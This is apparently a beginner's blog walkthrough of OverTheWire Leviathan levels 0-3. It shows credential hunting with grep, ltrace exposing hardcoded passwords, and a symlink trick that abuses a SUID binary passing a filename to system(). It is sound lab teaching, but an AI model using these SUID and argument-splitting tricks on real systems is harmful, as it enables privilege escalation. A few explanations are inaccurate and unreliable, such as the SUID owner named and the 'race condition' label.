---
title: "Leviathan | Levels 0-3 | Binary Tracing & SUID Exploitation"
date: 2026-05-10T10:52:23+02:00
lastmod: 2026-05-10T10:52:23+02:00
description: "A beginner-friendly walkthrough of Levels 0-3 in the Leviathan wargame from OverTheWire. Learn how to trace binary execution with ltrace, understand SUID permissions and exploit a race condition vulnerability, these are the first real steps in binary analisys."
summary: "A beginner-friendly walkthrough of Levels 0-3 in the Leviathan wargame from OverTheWire. Learn how to trace binary execution with ltrace, understand SUID permissions and exploit a race condition vulnerability, these are the first real steps in binary analisys."
categories: ["WarGames", "OverTheWire", "Linux"]
series: ["OverTheWire - Leviathan"] # If you write several articles on the same subject
seriesOrder: 1
showSummary: true
showTableOfContents: true
showTaxonomies: true
showReadingTime: true
showWordCount: false
showDate: true
draft: false
---

# Introduction

If Bandit was the Linux bootcamp, Leviathan is where things start to get interesting. Instead of just reading files and navigating directories, you're now dealing with compiled binaries, SUID bits and your first taste of binary analisys. The wargame is rated 1/10 difficulty but a couple of these levels require a real shift in thinking compared to what you've done before.

The key tool you'll be reaching for throughout this series is `ltrace`. Get comfortable with it.

## Level 0 -> 1

**Level Goal**

> Data for the levels can be found in the homedirectories. You can look at /etc/leviathan_pass for the various level passwords.

**Solution**

Connect to the server as `leviathan0`, note the port is **2223**, different from bandit:

```
[greycipher@remnant ~]$ ssh leviathan0@leviathan.labs.overthewire.org -p 2223
```

Once in, list everything including hidden files:

```
leviathan0@leviathan:~$ ls -la
total 24
drwxr-xr-x   3 root       root       4096 Apr  3 15:19 .
drwxr-xr-x 150 root       root       4096 Apr  3 15:20 ..
drwxr-x---   2 leviathan1 leviathan0 4096 Apr  3 15:19 .backup
-rw-r--r--   1 root       root        220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root       root       3851 Apr  3 15:10 .bashrc
-rw-r--r--   1 root       root        807 Mar 31  2024 .profile

leviathan0@leviathan:~$ cd .backup
leviathan0@leviathan:~/.backup$ ls
bookmarks.html
```

A massive HTML file. Reading it manually would take forever, use `grep` to filter for that matters:

```
leviathan0@leviathan:~/.backup$ grep leviathan1 bookmarks.html
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is [REDACTED]" ...>password to leviathan1</A>
```

**Notes**

- `grep` scans a file for lines matching a pattern, essential when you're dealing with large files.
- It's common in real-world pentesting to find credentials left in browser exports, config backups and similar files that people forget about.

---

## Level 1 -> 2

**Level Goal**

> (No hint given, figure it out.)

**Solution**

Connect as `leviathan1` and see what's in the home directory:

```
leviathan1@leviathan:~$ ls -la
total 36
drwxr-xr-x   2 root       root        4096 Apr  3 15:19 .
drwxr-xr-x 150 root       root        4096 Apr  3 15:20 ..
-rw-r--r--   1 root       root         220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root       root        3851 Apr  3 15:10 .bashrc
-r-sr-x---   1 leviathan2 leviathan1 15088 Apr  3 15:19 check
-rw-r--r--   1 root       root         807 Mar 31  2024 .profile
```

There's a SUID binary called `check`. Running it asks for a password:

```
leviathan1@leviathan:~$ ./check
password: test
Wrong password, Good Bye ...
```

The binary is comparing out input against something hardcoded. This is a job for `ltrace`, which intercepts and displays library calls made by a program as it runs:

```
leviathan1@leviathan:~$ ltrace ./check
printf("password: ")                    = 10
getchar(...)                            = ...
strcmp("test", "sex")                   = -1
puts("Wrong password, Good Bye ...")
```

The `strcmp` call gives it away, it's comparing out input against the string `"sex"`. Now run the binary directly without `ltrace`, as it drops the elevated privileges:

```plaintext
leviathan1@leviathan:~$ ./check
password: sex
$ whoami
leviathan2
$ cat /etc/leviathan_pass/leviathan2
[REDACTED]
```

**Notes**

- `ltrace` traces **library calls** (C functions like `printf`, `strcmp`). This is different from `strace`, which traces **system calls** (lower level kernel interactions like `read`, `write`). For this kind of challenge, `ltrace` is almost always more useful.
- The SUID bit (`s` in `-r-sr-x---`) means the binary runs with the permissions of its owner (`leviathan1`) rather than the user executing it. That's whi getting a shell through it gives us elevated access.
- Always run SUID binaries directly when exploiting them, tracing tools like `ltrace` drop those elevated privileges.

---

## Level 2 -> 3

**Level Goal**

> (No hint given.)

**Solution**

Connect as `leviathan2`:

```
leviathan2@leviathan:~$ ls -la
total 36
drwxr-xr-x   2 root       root        4096 Apr  3 15:19 .
drwxr-xr-x 150 root       root        4096 Apr  3 15:20 ..
-rw-r--r--   1 root       root         220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root       root        3851 Apr  3 15:10 .bashrc
-r-sr-x---   1 leviathan3 leviathan2 15076 Apr  3 15:19 printfile
-rw-r--r--   1 root       root         807 Mar 31  2024 .profile
```

A SUID binary called `printfile`. It takes a filename as an argument and prints it, like `cat`. Let's trace it:

```
leviathan2@leviathan:~$ mkdir /tmp/greycipher && cd /tmp/greycipher
leviathan2@leviathan:/tmp/greycipher$ touch test.txt
leviathan2@leviathan:/tmp/greycipher$ ltrace ~/printfile test.txt
__libc_start_main(0x80490ed, 2, 0xffffd424, 0 <unfinished ...>
access("test.txt", 4)                                          = 0
snprintf("/bin/cat test.txt", 511, "/bin/cat %s", "test.txt")  = 17
geteuid()                                                      = 12002
geteuid()                                                      = 12002
setreuid(12002, 12002)                                         = 0
system("/bin/cat test.txt" <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                         = 0
+++ exited (status 0) +++
```

Two things stand out: `access()` checks if we have permission to read the file and then `system()` runs `/bin/cat` on it. So far so good. But what happens with a filename that contains a space?

```
leviathan2@leviathan:/tmp/greycipher$ touch "pass file.txt"
leviathan2@leviathan:/tmp/greycipher$ ltrace ~/printfile "pass file.txt"
__libc_start_main(0x80490ed, 2, 0xffffd424, 0 <unfinished ...>
access("pass file.txt", 4)                                     = 0
snprintf("/bin/cat pass file.txt", 511, "/bin/cat %s", "pass file.txt") = 22
geteuid()                                                      = 12002
geteuid()                                                      = 12002
setreuid(12002, 12002)                                         = 0
system("/bin/cat pass file.txt"/bin/cat: pass: No such file or directory
/bin/cat: file.txt: No such file or directory
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                         = 256
+++ exited (status 0) +++
```

The vulnerability is here: `access()` checks the whole path `"pass file.txt"` as a single string, but when `system()` runs `/bin/car pass file.txt`, the shell splits it into two separate arguments, `pass` and `file.txt`.

We can exploit this. Create a symlink named `pass` pointing to the password file, then trick the binary into reading it:

```
leviathan2@leviathan:/tmp/greycipher$ ln -s /etc/leviathan_pass/leviathan3 /tmp/greycipher/pass
leviathan2@leviathan:/tmp/greycipher$ ~/printfile "pass file.txt"
[REDACTED]
/bin/cat: file.txt: No such file or directory
```

`access()` happily checks `"pass file.txt"` and finds it readable. Then `cat` splits the string and reads `pass`, which is our symlink to the password file, using `leviathan3`'s SUID privileges.

**Notes**

- This is a classic **TOCTOU** (Time-of-Check to Time-of-Use) vulnerability. The check (`access()`) and the action (`system()`) operate on different interpretations of the same input, which opens the door for exploitation.
- `ln -s <target> <link>` creates a symbolic link, a pointer to another file. The link is read as if it were the file it points to.
- The error on `file.txt` is expected and harmless, we already got what we needed.

---

## Level 3 -> 4

**Level Goal**

> (No hint given.)

**Solution**

Connect as `leviathan3`:

```
leviathan3@leviathan:~$ ls -la
total 40
drwxr-xr-x   2 root       root        4096 Apr  3 15:19 .
drwxr-xr-x 150 root       root        4096 Apr  3 15:20 ..
-rw-r--r--   1 root       root         220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root       root        3851 Apr  3 15:10 .bashrc
-r-sr-x---   1 leviathan4 leviathan3 18100 Apr  3 15:19 level3
-rw-r--r--   1 root       root         807 Mar 31  2024 .profile
```

Another SUID binary. Running it:

```
leviathan3@leviathan:~$ ./level3
Enter the password> test
bzzzzzzzzap. WRONG
```

By now you know the drill:

```
leviathan3@leviathan:~$ ltrace ./level3
__libc_start_main(0x80490ed, 1, 0xffffd474, 0 <unfinished ...>
strcmp("h0no33", "kakaka")                                     = -1
printf("Enter the password> ")                                 = 20
fgets(Enter the password> test
"test\n", 256, 0xf7fab5c0)                               = 0xffffd24c
strcmp("test\n", "snlprintf\n")                                = 1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                                     = 19
+++ exited (status 0) +++
```

There are two `strcmp` calls. The first one (`h0no33` vs `kakaka`) is a decoy, it runs before any user input. The second one is what matters: our input is being compared against `"snlprintf"`. Supply it:

```
leviathan3@leviathan:~$ ./level3
Enter the password> snlprintf
[You've got shell]!
$ whoami
leviathan4
$ cat /etc/leviathan_pass/leviathan4
[REDACTED]
```

**Notes**

- The decoy `strcmp` is a simple obfuscation attempt, something you'll see more of as challenges get harder. `ltrace` cuts right through it.
- Notice that `fgets` appends a newline character `\n` to the input, which is why `ltrace` shows `"snlprintf\n"` rather than just `"snlprintf"`. The binary handles the comparison accordingly, so you don't need to worry about it when typing the password manually.

